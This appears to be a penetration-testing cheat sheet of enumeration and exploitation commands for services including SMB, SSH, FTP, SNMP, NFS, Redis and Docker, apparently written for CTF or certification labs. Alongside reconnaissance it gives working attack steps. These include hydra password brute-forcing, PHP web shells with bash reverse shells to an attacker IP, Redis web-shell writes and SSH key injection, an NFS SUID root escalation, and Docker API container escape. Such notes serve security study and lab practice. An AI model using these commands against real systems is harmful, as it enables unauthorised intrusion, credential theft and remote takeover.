# 🛠️ Common Service-Specific Enumeration

## SMB/NetBIOS (139, 445)

### Basic Enumeration
- [ ] **SMB Protocol Negotiation**:
  ```bash
  nmap --script smb-protocols <target>
  or
  nmap -p 445 --script smb-os-discovery,smb-enum-users,smb-enum-shares <TARGET_IP>
  ```
- [ ] **Share Enumeration**:
  ```bash
  # anonymous access (Leave Password Blank)
  smbclient -L //<target> -N
  smbclient -L //<target> -U guest%
  smbclient -L //<TARGET_IP>/ --no-pass

  #Found an interesting share? Try connecting to it.
  smbclient //TARGET_IP/Share name --no-pass

  #Connected?
  dir
  get <filename.zip>

  #If it is a zip, you can extract it
  7z x emails.zip

  #Password protected?
  zip2john FILENAME.zip | tee CHOSEN_FILE_NAME_hash

  #Crack some hashes
  john CHOSEN_FILE_NAME --wordlist=/usr/share/wordlists/rockyou.txt
  
  #Unzip the file again and input pass
  7z x FILENAME.zip

  #Inspect files
  cd
  cat
  ls -lart

  ```
- [ ] **Comprehensive SMB Enum**:
  ```bash
  enum4linux -a <target>
  enum4linux-ng -A <target>
  ```

### Advanced SMB Techniques
- [ ] **SMB Vulnerability Scanning**:
  ```bash
  nmap --script smb-vuln* <target>
  ```
- [ ] **SMB Share Access**:
  ```bash
  # Connect to a specific share:
  smbclient //<target>/<share> -N
  smbmap -H <target>
  smbmap -H <target> -u null -p null
  ```
- [ ] **RPC Enumeration**:
  ```bash
  rpcclient -U "" -N <target>
  # Commands: enumdomusers, enumdomgroups, queryuser <rid>
  ```
- [ ] **SMB Recon with CME**

```bash
/usr/bin/crackmapexec smb <TARGET_IP> --shares
/usr/bin/crackmapexec smb <TARGET_IP> --sessions
/usr/bin/crackmapexec smb <TARGET_IP> --users
/usr/bin/crackmapexec smb <TARGET_IP> -u '' -p '' --shares # Anonymous test
```
- [ ] **SMB Recon with NetExec (NXC)**
```bash
/usr/bin/nxc smb <TARGET_IP> --shares
/usr/bin/nxc smb <TARGET_IP> --users
/usr/bin/nxc smb <TARGET_IP> --sessions
/usr/bin/nxc smb <TARGET_IP> -u guest -p '' --shares
```
- [ ] **SMB Recon with Impacket**
```bash
## List shares (no auth):
/usr/share/doc/python3-impacket/examples/smbclient.py <TARGET_IP> -no-pass

## Dump SMB password policy:
/usr/share/doc/python3-impacket/examples/polenum.py <TARGET_IP>

#→ If authentication is required:
/usr/share/doc/python3-impacket/examples/polenum.py -u <user> -p <pass> <TARGET_IP>
```
- [ ] **Mounting SMB Share Locally**
```bash
mkdir -p /mnt/smb
mount -t cifs //<TARGET_IP>/public /mnt/smb -o guest
cd /mnt/smb && ls -la
```

- [ ] **SMB With Metasploit**
```bash
## Enumerate shares:
sudo msfconsole -q
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <TARGET_IP>
run

## Enumerate users:
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <TARGET_IP>
run
```
---

## SSH (22)
### Basic Enumeration

- [ ] **SMB With Metasploit**
  ```bash
  nmap -p 22 -sV -sC <TARGET_IP>
  ```
- [ ] **Banner Grabbing**:
  ```bash
  nc <target> 22
  ssh-keyscan <target>
  ```
- [ ] **SSH Audit**:
  ```bash
  ssh-audit <target>
  ```
- [ ] **Searchsploit**
  ```bash
  searchsploit openssh <VERSION_FROM_NMAP>
  ```

- [ ] **Run SSH brute-force login attempt (if usernames are known)**
  ```bash
  hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>

  # Multiple Users
  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>

  #or
  nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=rockyou.txt <TARGET_IP>
  ```

- [ ] **Check for default or easy creds manually**
  ```bash
  ssh <USERNAME>@<TARGET_IP>

  #Logged in?
  
  #Upgrade Shell for ease of use
  /bin/bash
  id

  #Annotate groups
  Example: uid-1000(franky) gid=1000(franky) groups=1000(franky),4(homebase)

  #Inspect the disk space summary usage for each mounted file
  df -h

  #focus on is where the root filesystem is mounted IE: "/"
  #examine this partition where it will potentially allow us to create/read directory contents
  debugfs /dev/mapper/ubuntu--vg-ubuntu--lv

  #test our permissions
  mkdir test

  #Is it Read/only? Check for root SSH key
  cat /root/.ssh/id_rsa

  #Copy key and change its permissions
  chmod 600 id_rsa

  #Confirm permission change
  ls -lart id_rsa

  #Log in as root or user
  ssh -i id_rsa root@<Target IP>
  ```
- [ ] **Check for authorized SSH keys or reuse**
  ```bash
  cat ~/.ssh/authorized_keys
  ```

- [ ] **Look for `.ssh/id_rsa` or `known_hosts`   in home directories (post-exploit)**
  ```bash
  find /home -name id_rsa 2>/dev/null
  ```
- [ ] **Login with Private Key**
  ```bash
  ssh -i id_rsa <USERNAME>@<TARGET_IP>
  #Make sure permissions are:
  chmod 600 id_rsa
  ```
- [ ] **Target SSH on Non-Standard Port**
  ```bash
  ssh -p <PORT> <USERNAME>@<TARGET_IP>
  ```

### Advanced SSH Testing
- [ ] **Username Enumeration** (CVE-2018-15473):
  ```bash
  python3 ssh_user_enum.py --port 22 --userList users.txt <target>
  ```
- [ ] **Key-based Authentication Testing**:
  ```bash
  ssh -i <private_key> user@<target>
  ```
- [ ] **SSH Tunneling Opportunities**: Note for later lateral movement

### Post Exploit SSH 
- [ ] **Check for SSH Private Keys (for Pivot or Priv-Esc)**
  ```bash
  find /home -name id_rsa 2>/dev/null
  #or
  find / -name id_rsa 2>/dev/null
  ```

- [ ] **Look for Saved Credentials in Known Hosts or Keys**
  ```bash
  cat ~/.ssh/known_hosts
  #or
  cat ~/.ssh/id_rsa.pub
  ```
- [ ] **Copy a Found Key and Use It to Access Another System**
  ```bash
  scp <USERNAME>@<TARGET_IP>:/home/<user>/.ssh/id_rsa .
  #and
  chmod 600 id_rsa
  #and
  ssh -i id_rsa <USER>@<OTHER_HOST>
  ```
- [ ] **Check if Root’s SSH Keys Are World-Readable**
  ```bash
  ls -la /root/.ssh/
  ```
## **If successful, peform information gathering on Linux**
---

## FTP/TFTP (21/69)
### Basic FTP Testing
- [ ] **Anonymous Login**:
  ```bash
  ftp <target>
  # anonymous:anonymous or anonymous:email@domain.com
  ```
- [ ] **FTP Banner & Version**:
  ```bash
  nc <target> 21
  nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <target>
  ```
- [ ] **Search for Public Exploits**:
  ```bash
  searchsploit vsftpd <VERSION>

  #See one? Grab it:
  Ex: searchsploit -m unix/remote/49757.py
  #then
  ls -l 49757.py
  ```


####Advanced FTP Enumeration
- [ ] **FTP Brute Force** (if needed):
  ```bash
  hydra -L users.txt -P passwords.txt ftp://<target>
  ```
- [ ] **TFTP Testing** (UDP 69):
  ```bash
  tftp <target>
  # Try: get /etc/passwd
  # Try to download a commonly named config file:
    tftp> get test.txt
    tftp> get backup.cfg
    tftp> quit
    #Try uploading (if allowed):
    tftp <TARGET_IP>
    tftp> put shell.sh
    tftp> quit
  ```
#### FTP Notes
```bash
#331 Please specify the password.
#230 Login successful.

#What you can do as your next steps:
#→ Use `ls`, `get`, and `cd` to browse and download files.
#→ Look for credentials, backup files, or web content.
#→ If write is allowed, consider uploading a web shell (if served over HTTP).
```
- [ ] **Listing Files and Directories**
  ```bash
  ls or `dir`
  cd <folder>
  pwd
  get <filename>
  put <filename>
    # IF PUT WORKS
      cp /usr/share/webshells/php/php-reverse-shell.php .
      #or
      <?php system("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'"); ?>
      #or
      echo "<?php system('bash -c \"bash -i >& /dev/tcp/YOUR IP/4444 0>&1\"'); ?>" > rev.php
    # Edit the Shell
    $ip = 'YOUR_IP'; // your tun0 IP (VPN)
    $port = 4444; // port you’ll listen on

      put test.php
      #then: Start Your Listener: 
      nc -lvnp 4444
      #In browser: 
      http://<TARGET_IP>/test.php
    #should receive a shell, Upgrade it
    python3 -c 'import pty; pty.spawn("/bin/bash")'
- [ ] **Bruteforce FTP Login**
  ```bash
  hydra -L users.txt -P passwords.txt ftp://<TARGET_IP> -o ftp_brute.txt
  ```
---

## SNMP (161/UDP)
### Basic SNMP Enumeration
- [ ] **RUN NMAP**:
  ```bash
  nmap -sU -p 161 --script snmp* -Pn <TARGET_IP>
  ```

- [ ] **Scan for common community strings using Common OneSixtyOne Wordlist**:
  ```bash
  #If onesixtyone is not installed/working:
  sudo apt install onesixtyone

  #Then run
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET_IP>
  onesixtyone -c /usr/share/metasploit-framework/data/wordlists/nmp_default_pass.txt <TARGET_IP>
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-comm.txt <TARGET_IP>
  #Example Results:
  [192.168.62.34] - public
  [192.168.62.34] - private
  ```
- [ ] **SNMP TREE DUMP**:
  ```bash
  #First make sure you have snmp mibs installed:
  sudo apt-get install snmp-mibs-downloader
    #Edit file and add hashtag "#" on mibs line: "#mibs :"
  sudo nano /etc/snmp/.conf
  #then
  snmpwalk -v2c -c `<COMMUNITY_STRING>` <TARGET_IP>
  #or
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP>
  #Example Results:
  SNMPv2-MIB::sysName.0 = STRING: server01
  SNMPv2-MIB::sysContact.0 = STRING: admin@example.com
  SNMPv2-MIB::sysDescr.0 = STRING: Linux ubuntu 4.15.0-45-genericConfirm MIBS is hashed out via: /etc/snmp/.conf
- [ ] **Enumerate Running ProcessesP**:
  ```bash
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
  #Example Results:
  HOST-RESOURCES-MIB::hrSWRunName.1234 = STRING: "sshd"
  HOST-RESOURCES-MIB::hrSWRunName.1235 = STRING: "cron"
  HOST-RESOURCES-MIB::hrSWRunName.1236 = STRING: "bash"
- [ ] **Enumerate Installed Software**:
  ```bash
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
  #Example Results:
  HOST-RESOURCES-MIB::hrSWInstalledName.1 = STRING: "Nmap 7.91"
  HOST-RESOURCES-MIB::hrSWInstalledName.2 = STRING: "Putty"
  HOST-RESOURCES-MIB::hrSWInstalledName.3 = STRING: "Wireshark"
- [ ] **Enumerate User Accounts**:
  ```bash
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.4.1.77.1.2.25
  #Example Results:
  iso.3.6.1.4.1.77.1.2.25.1.1.1 = STRING: "Administrator"
  iso.3.6.1.4.1.77.1.2.25.1.1.2 = STRING: "Guest"
  iso.3.6.1.4.1.77.1.2.25.1.1.3 = STRING: "jack"
- [ ] **  OTHER STRINGS OF INTEREST**:
  ```bash
  1.3.6.1.2.1.25.1.6.0 System Processes
  1.3.6.1.2.1.25.4.2.1.2 Running Programs
  1.3.6.1.2.1.25.4.2.1.4 Processes Path
  1.3.6.1.2.1.25.2.3.1.4 Storage Units
  1.3.6.1.2.1.25.6.3.1.2 Software Name
  1.3.6.1.4.1.77.1.2.25 User Accounts
  1.3.6.1.2.1.6.13.1.3 TCP Local Ports
- [ ] **Discover Extended SNMP Commands (Net-SNMP extend)**:
  ```bash
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendConfigCommand
  #Example Results:
  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."passwd" = STRING: /bin/cat /root/creds.txt
  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."status" = STRING: /usr/bin/uptime

- [ ] ***Get Output of Extended SNMP Commands**:
  ```bash
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
  #ExampleResults:
  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."passwd" = STRING: bobby:NOTaRealPassword
  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."status" = STRING: 01:42:30 up 4 days, 3:44, 2 users, load average: 0.02, 0.04, 0.05

- [ ] ***Walk the Entire SNMP Tree (Full OID Fuzz)***:
  ```bash
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1
  #Example Results:
  SNMPv2-MIB::sysDescr.0 = STRING: Linux target 4.19.0
  ...
  HOST-RESOURCES-MIB::hrSWRunName.1023 = STRING: "apache2"
  ...
  iso.3.6.1.4.1.77.1.2.25.1.1.1 = STRING: "admin"

  #Use SNMP-check (if installed) for structured output:
  snmp-check <TARGET_IP> -c public

  #What Commands are Available?
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendConfigCommand
  Exmple RESULTS:
  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."passwd" = STRING: /bin/cat /root/creds.txt  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."scan" = STRING: /usr/local/bin/scan_network.sh

  #To Get the Output of Those Commands
  snmpwalk -v 1 -c <COMMUNITY STRING> <TARGET IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
  #Example RESULTS:
  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."passwd" = STRING: USERNAME:PASSWORD
  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."scan" = STRING: Alive hosts: <HOST IP>, <HOST IP>
  ```
- [ ] **Community String Testing**:
  ```bash
  snmpwalk -v2c -c public <target>
  snmpwalk -v2c -c private <target>
  #Run Nmap UDP script scan for SNMP detection
  nmap -sU -p 161 --script snmp* -Pn <TARGET_IP>

  #Brute-force community strings (stop here if none work)
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-comm.txt <TARGET_IP>

  #Check if SNMP v1 responds to valid community string (e.g., "public")
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP>

  #Dump system description, hostname, and uptime
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> SNMPv2-MIB::sysDescr

  #Enumerate running processes
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2

  #Enumerate local user accounts (especially on Windows)
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.4.1.77.1.2.25

  #Enumerate installed software
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2

  #Discover extended SNMP commands (Net-SNMP Extend MIB)
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendConfigCommand

  #Dump output of extended SNMP commands (if any found)
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull

  #Walk full SNMP OID tree for hidden or custom data (optional, noisy)
  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1
  ```
- [ ] **SNMP Brute-force**:
  ```bash
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target>
  ```

### Advanced SNMP Enumeration
- [ ] **System Information**:
  ```bash
  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0  # System description
  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.1.6.0  # Running processes
  ```
- [ ] **User Enumeration**:
  ```bash
  snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25  # Windows users
  ```

---

## NFS (2049)

### Basic NFS Enumeration
- [ ] **Showmount Exports**:
  ```bash
  showmount -e <target>
  ```
- [ ] **Nmap NFS Scripts**:
  ```bash
  nmap -p 2049 --script=nfs-showmount,nfs-ls,nfs-statfs <target>
  ```

### Advanced NFS Enumeration
- [ ] **List NFS Shares with Details**:
  ```bash
  nmap -p 2049 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
  ```
- [ ] **Mount NFS Share**:
  ```bash
  sudo mkdir /mnt/nfs
  sudo mount -t nfs <target>:/<share> /mnt/nfs
  ```
- [ ] **Check for no_root_squash** (Critical for Privilege Escalation):
  - Review `/etc/exports` if accessible
  - Look for `no_root_squash` or `no_all_squash` options
- [ ] **Create SUID Binary for PE** (if no_root_squash):
  ```bash
  # On attacking machine as root
  cp /bin/bash /mnt/nfs/bash
  chmod +s /mnt/nfs/bash
  # On target machine
  ./bash -p
  ```
- [ ] **NFS NULL Session**:
  ```bash
  rpcinfo -p <target>
  ```

---

## VNC (5900+)

### Basic VNC Enumeration
- [ ] **Nmap VNC Scripts**:
  ```bash
  nmap -p 5900-5906 --script vnc-info,vnc-title <target>
  ```
- [ ] **VNC Password Brute Force**:
  ```bash
  nmap -p 5900 --script vnc-brute <target>
  ```

### Advanced VNC Enumeration
- [ ] **Connect with VNC Viewer**:
  ```bash
  vncviewer <target>:5900
  # Or try different displays
  vncviewer <target>::5901
  ```
- [ ] **VNC Authentication Bypass**:
  ```bash
  nmap -p 5900 --script realvnc-auth-bypass <target>
  ```
- [ ] **Check for VNC without Authentication**:
  ```bash
  # Often misconfigured in CTF environments
  ```

---

## Redis (6379)

### Basic Redis Enumeration
- [ ] **Redis-CLI Connect**:
  ```bash
  redis-cli -h <target>
  redis-cli -h <target> -p 6379
  ```
- [ ] **Banner and Info Grab**:
  ```bash
  redis-cli -h <target> info
  echo -e "*1\r\n$4\r\ninfo\r\n" | nc <target> 6379
  ```

### Advanced Redis Enumeration
- [ ] **Nmap Redis Scripts**:
  ```bash
  nmap -p 6379 --script redis-info,redis-brute <target>
  ```
- [ ] **List All Keys**:
  ```bash
  redis-cli -h <target> keys "*"
  ```
- [ ] **Redis RCE via Web Shell** (if web directory writable):
  ```bash
  redis-cli -h <target>
  config set dir /var/www/html
  config set dbfilename shell.php
  set webshell "<?php system($_GET['cmd']); ?>"
  save
  ```
- [ ] **Redis SSH Key Injection**:
  ```bash
  # Generate SSH key pair
  ssh-keygen -t rsa
  # Write public key to Redis
  redis-cli -h <target> flushall
  redis-cli -h <target> set crackit "\n\n$(cat ~/.ssh/id_rsa.pub)\n\n"
  redis-cli -h <target> config set dir /home/user/.ssh
  redis-cli -h <target> config set dbfilename authorized_keys
  redis-cli -h <target> save
  ```

---

## Memcached (11211)

### Basic Memcached Enumeration
- [ ] **Banner Grab and Stats**:
  ```bash
  echo "stats" | nc <target> 11211
  echo "version" | nc <target> 11211
  ```
- [ ] **List All Items**:
  ```bash
  echo "stats items" | nc <target> 11211
  echo "stats cachedump 1 0" | nc <target> 11211
  ```

### Advanced Memcached Enumeration
- [ ] **Nmap Memcached Scripts**:
  ```bash
  nmap -p 11211 --script memcached-info <target>
  ```
- [ ] **Extract Data**:
  ```bash
  # After finding keys from cachedump
  echo "get <keyname>" | nc <target> 11211
  ```
- [ ] **UDP Amplification Check**:
  ```bash
  nmap -sU -p 11211 --script memcached-info <target>
  ```

---

## RPCBind (111)

### Basic RPCBind Enumeration
- [ ] **RPCInfo**:
  ```bash
  rpcinfo -p <target>
  rpcinfo -T tcp <target>
  ```
- [ ] **Nmap RPC Scripts**:
  ```bash
  nmap -sV -p 111 --script=rpcinfo,nfs-showmount <target>
  ```

### Advanced RPCBind Enumeration
- [ ] **Enumerate NFS via RPC**:
  ```bash
  # Look for mountd, nfs, nlockmgr services
  rpcinfo -p <target> | grep nfs
  ```
- [ ] **Check for Other RPC Services**:
  ```bash
  # Look for rusers, rstatd, etc.
  ```

---

## Docker (2375/2376)

### Basic Docker Enumeration
- [ ] **Docker API Version Check**:
  ```bash
  curl http://<target>:2375/version
  curl -s http://<target>:2375/containers/json
  ```
- [ ] **List Images**:
  ```bash
  curl -s http://<target>:2375/images/json
  ```

### Advanced Docker Enumeration
- [ ] **Nmap Docker Scripts**:
  ```bash
  nmap -p 2375,2376 --script docker-version <target>
  ```
- [ ] **Container Escape/RCE**:
  ```bash
  # Create privileged container
  curl -X POST -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["sh"],"Privileged":true,"Volumes":{"/:/host":{}}}' \
    http://<target>:2375/containers/create
  ```
- [ ] **Execute Commands in Container**:
  ```bash
  # Get container ID and exec into it
  curl -X POST http://<target>:2375/containers/<id>/start
  curl -X POST -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/passwd"]}' \
    http://<target>:2375/containers/<id>/exec
  ```

---